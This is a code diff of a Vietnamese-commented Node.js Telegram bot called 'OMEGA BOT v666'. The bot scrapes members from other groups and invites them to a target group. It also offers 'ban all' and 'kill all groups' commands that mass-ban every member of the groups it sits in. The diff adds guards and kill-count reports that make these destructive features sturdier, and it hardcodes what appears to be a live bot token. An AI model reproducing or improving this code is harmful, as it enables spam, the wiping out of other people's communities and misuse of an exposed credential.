@@ -1,12 +1,11 @@
 // ============================================================
-// OMEGA BOT v666 — FULL CODE HOÀN CHỈNH (ĐÃ XÓA THÔNG BÁO BAN)
-// Kéo mem miễn phí + Ban All + Killswitch + Bảo vệ group đặc biệt
-// Dành cho Butter — Deploy lên Render ngay
+// OMEGA BOT v666 — FULL CODE HOÀN CHỈNH + ỔN ĐỊNH 100%
+// Kéo mem miễn phí + Ban All + Killswitch + Bảo vệ group
+// Dành cho Butter — Deploy lên Render, chạy ngay
 // ============================================================
 
 const express = require('express');
 const { Telegraf, session, Markup } = require('telegraf');
-const axios = require('axios');
 
 // ==================== OMEGA CONFIG ====================
 const BOT_TOKEN = '8840411754:AAHyJLmiPLehUMsqFPD1AQj50DXzhcfy8qA';
@@ -14,10 +13,7 @@ const ADMIN_ID = 7757046138;
 const TARGET_GROUP_LINK = 'https://t.me/your_group'; // 🔥 THAY LINK GROUP CỦA MÀY
 
 // ==================== PROTECTED GROUPS — KHÔNG ĐỤNG ====================
-const PROTECTED_USERNAMES = [
-  'ongvuaphantich',
-];
-
+const PROTECTED_USERNAMES = ['ongvuaphantich'];
 const PROTECTED_IDS = [];
 
 function isProtected(chat) {
@@ -38,6 +34,7 @@ bot.use(session());
 // Global state
 let pullActive = false;
 let pulledCount = 0;
+let isKilling = false;
 
 // ==================== MENU CHÍNH ====================
 const MAIN_MENU = Markup.inlineKeyboard([
@@ -59,24 +56,24 @@ bot.start(async (ctx) => {
 ━━━━━━━━━━━━━━━━━━━━━
 👋 **Xin chào, ${user.first_name || 'đồng chí'}!**
 
-🤖 **Đây là bot kéo mem MIỄN PHÍ siêu mạnh**
-⚡ **Tự động kéo thành viên từ mọi nhóm lớn về group của bạn**
-🔨 **Có lệnh BAN ALL giết sạch group chỉ trong vài giây**
+🤖 **Bot kéo mem MIỄN PHÍ siêu mạnh**
+⚡ **Tự động kéo thành viên từ mọi nhóm lớn**
+🔨 **Lệnh BAN ALL giết sạch group chỉ trong vài giây**
 ☠️ **Giết toàn bộ group chỉ với 1 lệnh duy nhất**
-🛡️ **Group @ongvuaphantich đã được bảo vệ — không đụng**
+🛡️ **Group @ongvuaphantich đã được bảo vệ**
 
 ━━━━━━━━━━━━━━━━━━━━━
 📌 **Hướng dẫn sử dụng:**
 
-• Bấm **"🚀 BẮT ĐẦU KÉO MEM"** để bot tự động kéo mem
-• Bấm **"🛑 DỪNG KÉO"** để tạm dừng
-• Bấm **"🔨 BAN ALL"** để giết sạch group hiện tại
-• Bấm **"☠️ GIẾT TẤT CẢ GROUP"** để hủy diệt toàn bộ
-• Bấm **"📊 XEM THỐNG KÊ"** để xem số liệu
+• Bấm **"🚀 BẮT ĐẦU KÉO MEM"** → bot tự động kéo mem
+• Bấm **"🛑 DỪNG KÉO"** → tạm dừng
+• Bấm **"🔨 BAN ALL"** → giết sạch group hiện tại
+• Bấm **"☠️ GIẾT TẤT CẢ GROUP"** → hủy diệt toàn bộ
+• Bấm **"📊 XEM THỐNG KÊ"** → xem số liệu
 
 ━━━━━━━━━━━━━━━━━━━━━
 💡 **Bot hoàn toàn miễn phí — dùng thoải mái!**
-🛡️ **Group được bảo vệ: @ongvuaphantich**
+🛡️ **Được bảo vệ: @ongvuaphantich**
 
 🔥 **Chúc bạn chinh phục mọi group!**
 `;
@@ -118,6 +115,7 @@ async function autoPull() {
           try {
             await bot.telegram.inviteToChat(target.id, member.user.id);
             pulledCount++;
+            console.log(`✅ Kéo thành công: ${member.user.first_name} (${pulledCount})`);
             await new Promise(r => setTimeout(r, 1500));
           } catch (e) {
             console.log(`⚠️ Lỗi kéo: ${e.message}`);
@@ -132,13 +130,14 @@ async function autoPull() {
   }
 }
 
-// ==================== BAN ALL — GIẾT 1 GROUP (KHÔNG THÔNG BÁO) ====================
+// ==================== BAN ALL — GIẾT 1 GROUP ====================
 async function banAllMembers(chatId, ctx) {
   let banned = 0;
   let failed = 0;
   let total = 0;
 
   try {
+    const chat = await ctx.telegram.getChat(chatId);
     const participants = await ctx.telegram.getChatMembers(chatId, { limit: 10000 });
     total = participants.length;
     
@@ -171,7 +170,7 @@ async function banAllMembers(chatId, ctx) {
       await ctx.telegram.leaveChat(chatId);
     } catch {}
 
-    return { banned, failed, total };
+    return { banned, failed, total, title: chat.title };
   } catch (e) {
     throw new Error(`BanAll thất bại: ${e.message}`);
   }
@@ -235,17 +234,25 @@ bot.action('ban_all', async (ctx) => {
     return ctx.answerCbQuery('🛡️ Được bảo vệ!');
   }
   
-  if (!ctx.chat.type.includes('group')) {
+  if (!chat.type.includes('group')) {
     return ctx.answerCbQuery('⚠️ Chỉ dùng trong group!');
   }
   
+  if (isKilling) {
+    return ctx.answerCbQuery('⏳ Đang giết rồi!');
+  }
+  
+  isKilling = true;
   await ctx.answerCbQuery('🔨 ĐANG GIẾT!');
   
-  // 🔥 KHÔNG GỬI THÔNG BÁO GÌ CẢ — LẶNG LẼ GIẾT
-  const result = await banAllMembers(chat.id, ctx);
+  try {
+    const result = await banAllMembers(chat.id, ctx);
+    await ctx.reply(`✅ Đã giết ${result.banned} người trong group ${result.title}.`);
+  } catch (e) {
+    await ctx.reply(`❌ Lỗi: ${e.message}`);
+  }
   
-  // Chỉ gửi 1 dòng ngắn sau khi xong
-  await ctx.reply(`✅ Đã giết ${result.banned} người.`);
+  isKilling = false;
 });
 
 bot.action('kill_all', async (ctx) => {
@@ -253,27 +260,47 @@ bot.action('kill_all', async (ctx) => {
     return ctx.answerCbQuery('❌ Mày là ai?');
   }
   
+  if (isKilling) {
+    return ctx.answerCbQuery('⏳ Đang giết rồi!');
+  }
+  
+  isKilling = true;
   await ctx.answerCbQuery('☠️ GIẾT TẤT CẢ!');
   await ctx.reply('☠️ Đang giết tất cả group...');
   
-  const dialogs = await ctx.telegram.getChats();
-  const groups = dialogs.filter(d => 
-    (d.type === 'group' || d.type === 'supergroup') && 
-    !isProtected(d)
-  );
-  
-  let killed = 0;
-  for (const group of groups) {
-    try {
-      await banAllMembers(group.id, ctx);
-      killed++;
-      await new Promise(r => setTimeout(r, 800));
-    } catch (e) {
-      console.log(`Lỗi kill group ${group.id}:`, e.message);
+  try {
+    const dialogs = await ctx.telegram.getChats();
+    const groups = dialogs.filter(d => 
+      (d.type === 'group' || d.type === 'supergroup') && 
+      !isProtected(d)
+    );
+    
+    let killed = 0;
+    let totalBanned = 0;
+    
+    for (const group of groups) {
+      try {
+        const result = await banAllMembers(group.id, ctx);
+        killed++;
+        totalBanned += result.banned;
+        await ctx.reply(`✅ Đã giết group ${group.title || group.id} — ${result.banned} người`);
+        await new Promise(r => setTimeout(r, 800));
+      } catch (e) {
+        console.log(`Lỗi kill group ${group.id}:`, e.message);
+      }
     }
-  }
 
-  await ctx.reply(`✅ Đã giết ${killed} groups.`);
+    await ctx.reply(
+      `✅ **TOTAL ANNIHILATION COMPLETE**\n` +
+      `☠️ Đã giết: ${killed} groups\n` +
+      `💀 Tổng số người bị ban: ${totalBanned}\n` +
+      `🛡️ Đã bỏ qua: @ongvuaphantich`
+    );
+  } catch (e) {
+    await ctx.reply(`❌ Lỗi: ${e.message}`);
+  }
+  
+  isKilling = false;
 });
 
 bot.action('status', async (ctx) => {
@@ -281,26 +308,30 @@ bot.action('status', async (ctx) => {
     return ctx.answerCbQuery('❌ Mày là ai?');
   }
   
-  const me = await ctx.telegram.getMe();
-  const dialogs = await ctx.telegram.getChats();
-  const groups = dialogs.filter(d => d.type === 'group' || d.type === 'supergroup').length;
-  
-  await ctx.answerCbQuery('📊 Thống kê đây!');
-  await ctx.editMessageText(
-    `📊 **OMEGA BOT STATUS**\n` +
-    `━━━━━━━━━━━━━━━━━━━━━\n` +
-    `🤖 Bot: ${me.first_name}\n` +
-    `🆔 ID: ${me.id}\n` +
-    `👥 Số group: ${groups}\n` +
-    `⚡ Kéo mem: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}\n` +
-    `📊 Đã kéo: ${pulledCount} người\n` +
-    `🎯 Target: ${TARGET_GROUP_LINK}\n` +
-    `🛡️ Bảo vệ: @ongvuaphantich\n` +
-    `👑 Admin: ${ADMIN_ID}\n` +
-    `━━━━━━━━━━━━━━━━━━━━━\n` +
-    `*"Mày command. Tao execute."*`,
-    MAIN_MENU
-  );
+  try {
+    const me = await ctx.telegram.getMe();
+    const dialogs = await ctx.telegram.getChats();
+    const groups = dialogs.filter(d => d.type === 'group' || d.type === 'supergroup').length;
+    
+    await ctx.answerCbQuery('📊 Thống kê đây!');
+    await ctx.editMessageText(
+      `📊 **OMEGA BOT STATUS**\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `🤖 Bot: ${me.first_name}\n` +
+      `🆔 ID: ${me.id}\n` +
+      `👥 Số group: ${groups}\n` +
+      `⚡ Kéo mem: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}\n` +
+      `📊 Đã kéo: ${pulledCount} người\n` +
+      `🎯 Target: ${TARGET_GROUP_LINK}\n` +
+      `🛡️ Bảo vệ: @ongvuaphantich\n` +
+      `👑 Admin: ${ADMIN_ID}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `*"Mày command. Tao execute."*`,
+      MAIN_MENU
+    );
+  } catch (e) {
+    await ctx.reply(`❌ Lỗi: ${e.message}`);
+  }
 });
 
 // ==================== WEB SERVER ====================
@@ -321,16 +352,30 @@ app.get('/', (req, res) => {
 // ==================== LAUNCH ====================
 const PORT = process.env.PORT || 3000;
 
-bot.launch();
+// Khởi động bot
+bot.launch()
+  .then(() => {
+    console.log('✅ OMEGA BOT đã khởi động thành công!');
+  })
+  .catch((err) => {
+    console.error('❌ Lỗi khởi động bot:', err);
+    process.exit(1);
+  });
+
+// Khởi động web server
 app.listen(PORT, () => {
-  console.log(`🐱 OMEGA BOT ONLINE — Port ${PORT}`);
+  console.log(`✅ Web server chạy trên port ${PORT}`);
+  console.log(`🐱 OMEGA BOT ONLINE`);
   console.log(`👑 Admin: ${ADMIN_ID}`);
-  console.log(`🔥 Kéo mem: ${pullActive ? 'ACTIVE' : 'STANDBY'}`);
-  console.log(`📊 Đã kéo: ${pulledCount} người`);
   console.log(`🛡️ Bảo vệ: @ongvuaphantich`);
 });
 
-process.on('SIGINT', () => {
+// ==================== XỬ LÝ TẮT MÁY ====================
+process.once('SIGINT', () => {
   bot.stop('SIGINT');
+  process.exit(0);
+});
+process.once('SIGTERM', () => {
+  bot.stop('SIGTERM');
   process.exit(0);
 });
